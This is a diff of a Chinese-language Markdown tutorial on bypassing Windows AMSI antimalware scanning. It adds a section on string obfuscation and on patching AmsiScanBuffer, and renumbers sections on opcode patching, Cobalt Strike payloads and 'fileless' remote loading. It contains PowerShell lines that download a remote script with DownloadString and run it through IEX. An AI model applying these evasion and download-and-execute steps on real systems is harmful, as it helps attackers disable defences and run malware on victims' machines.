@@ -13,7 +13,27 @@
 ### 用户帐户控制或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）、 PowerShell（脚本、交互式使用和动态代码评估）、Windows 脚本宿主（wscript.exe 和 cscript.exe）、JavaScript 和VBScript Office VBA 宏  
 ### (请注意，AMSI 不仅用于扫描脚本、代码、命令或 cmdlet，还可以用于扫描任何文件、内存或数据流，例如字符串、即时消息、图片或视频。)
 
-# 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
+
+# 0x01.字符串绕过AMSI
+AMSI使用“基于字符串”的检测措施来确定PowerShell代码是否为恶意代码，如：
+![image](https://user-images.githubusercontent.com/89376703/155834753-e99e8456-fc84-4911-af6d-b8821946b083.png)
+## 这边简单介绍几种：
+## 1.用Replace函数去替换字符串内容
+![image](https://user-images.githubusercontent.com/89376703/155834805-44ed3e13-1e11-4cc9-94f5-bfbbfc2feef5.png)
+## 2.字符串断点+拼接
+![image](https://user-images.githubusercontent.com/89376703/155834827-6f9c03a3-0000-42df-816b-eaa23c876217.png)
+## 3.手工操作
+### 调试器附加并定位AmsiScanBuffer函数
+![image](https://user-images.githubusercontent.com/89376703/155834861-fa5d38c9-04ed-4ad0-bbfa-a68cf9b52a13.png)
+### 修补该函数使其直接返回(具体细节大家可以使用ida和x64dbg跟一下)。
+![image](https://user-images.githubusercontent.com/89376703/155834888-cd93fefe-7143-4a21-91fb-2d4a9b6c7cb6.png)
+### 绕过AMSI
+![image](https://user-images.githubusercontent.com/89376703/155834898-a4671d3e-958e-46f4-ab1a-8e8c64d5e696.png)
+
+
+
+
+# 0x02.通过修补 AMSI.dll 的操作码绕过ASMI
 
 ### 1.用cobaltstrike生成一个pyaload.ps1（）
 ![image](https://user-images.githubusercontent.com/89376703/155829428-4443b718-5d03-491f-84c7-87fbb089ddd0.png)
@@ -143,7 +163,7 @@ HRESULT AmsiScanBuffer(
 
 ## 在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。
 
-# 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
+# 0x03.分离免杀:抛弃 net webclient 远程加载方式（一）
 
 ## 首先我们需要对远程托管的Powershell样本进行免杀处理，然后在客户端用PowerShell脚本命令去读取远程托管的样本，并用IEX执行
 
@@ -183,7 +203,7 @@ IEX($content)
 
 
 
-# 0x03.远程加载方式（二）
+# 0x04.远程加载方式（二）
 
 
 
@@ -200,7 +220,7 @@ IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()
 
 
 
-# 0x04.远程加载方式（三）
+# 0x05.远程加载方式（三）
 
 ```
 IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
